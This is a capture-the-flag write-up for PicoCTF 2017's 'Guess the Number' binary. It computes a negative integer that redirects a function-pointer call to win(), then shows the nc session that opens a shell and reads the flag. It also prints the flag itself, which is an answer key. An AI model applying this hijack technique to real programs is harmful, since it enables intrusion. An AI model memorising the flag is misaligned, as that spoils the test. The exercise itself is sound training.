# PicoCTF 2017- Level 2 - Binary Exploitation 3

**Title:** Guess the Number  
**Category:** Binary Exploitation  
**Points:** 75  
**Description:**

>Just a simple number-guessing game. How hard could it be? [Binary](guess_num) [Source](guess_num.c). Connect on shell2017.picoctf.com:57641.  

**Hint:**

>What is the program doing with your input number?  
>strtol checks for overflow, but it does allow negative numbers...  

## Solution

Again, after looking at the source we can see that we need to call the `win()` function to get a shell:  
    $ gdb ./shells  
    (gdb) info address win  
    Symbol "win" is at 0x804852b in a file compiled without debugging.  

Looking at the source, we see that once we give a number to the program, it follows the following operation:  
```C  
printf("Enter your number: ");  
scanf("%32s", buf);  
val = strtol(buf, NULL, 10);  

printf("You entered %d. Let's see if it was right...\n", val);  

val >>= 4;  
((void (*)(void))val)();  
```

First, let's convert `0x804852b` to `1000000001001000010100101011`. We know that `strtol()` will check for overflow. After that `val >>= 4` will remove the last 4 bits of the number. So we should use:  
    10000000010010000101001010110000  
But now the number is too big to be entered.  As hinted, let's use a negative number:  
    python -c "print(-(0x100000000 - (0x804852b << 4)))"  
    -2142743888     

Now let's try to input `-2142743888`:

    $ nc shell2017.picoctf.com 57641  
    Welcome to the number guessing game!  
    I'm thinking of a number. Can you guess it?  
    Guess right and you get a shell!  
    Enter your number: -2142743888  
    You entered -2142743888. Let's see if it was right...  
    Congratulations! Have a shell:  
    /bin/sh: 0: can't access tty; job control turned off  
    $ ls -l  
    total 16  
    -r--r----- 1 hacksports guess-the-number_7   33 Mar 31  2017 flag.txt  
    -rwxr-sr-x 1 hacksports guess-the-number_7 5956 Mar 31  2017 guess_num  
    -rwxr-sr-x 1 hacksports guess-the-number_7  127 Apr  3  2017 xinetd_wrapper.sh  
    cat flag.txt  
    c2bda0bde530c16fff8a8530addb44f8  



The flag is `c2bda0bde530c16fff8a8530addb44f8`